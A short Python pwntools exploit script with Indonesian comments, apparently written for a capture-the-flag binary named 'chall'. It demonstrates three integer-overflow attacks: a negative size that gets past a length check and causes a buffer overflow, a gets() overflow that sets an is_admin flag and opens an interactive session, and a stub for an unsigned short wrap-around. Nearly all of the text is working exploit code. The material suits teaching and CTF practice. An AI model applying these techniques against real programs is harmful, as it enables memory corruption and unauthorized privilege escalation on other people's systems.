# Script contoh exploit integer overflow - bypass cek ukuran dan variable overwrite.
# Jalankan: python3 int_overflow.py

from pwn import *

context.binary = elf = ELF("./chall")
io = process("./chall")
# io = remote("host.ctf.com", 1337)

# ===== Kasus 1: bypass cek dengan angka negatif =====
# asumsi program:
#   int size; scanf("%d", &size);
#   if (size > 64) { reject }
#   char buf[64]; read(0, buf, size);   <- size jadi unsigned -> huge
print("[*] Kasus 1: bypass cek ukuran")

io.sendlineafter(b"Ukuran: ", b"-1")     # lolos if (size > 64)
io.sendline(cyclic(200))                  # read(0, buf, huge) -> overflow
io.wait()
# crash -> cari offset dari core
core = io.corefile
offset = cyclic_find(core.fault_addr)
print(f"[+] Offset: {offset}")

# ===== Kasus 2: variable overwrite =====
# asumsi program:
#   struct { char name[16]; int is_admin; } user;
#   gets(user.name);
print("\n[*] Kasus 2: timpa is_admin")

payload = b"A" * 16        # isi name
payload += p32(1)          # is_admin = 1
io = process("./chall")    # restart
io.sendlineafter(b"Nama: ", payload)
io.interactive()

# ===== Kasus 3: wrap around (user_len + 1) =====
print("\n[*] Kasus 3: wrap around unsigned short")
# unsigned short len = user_len + 1; -> kirim 65535 -> len = 0
# io = process("./chall")
# io.sendlineafter(b"Panjang: ", b"65535")
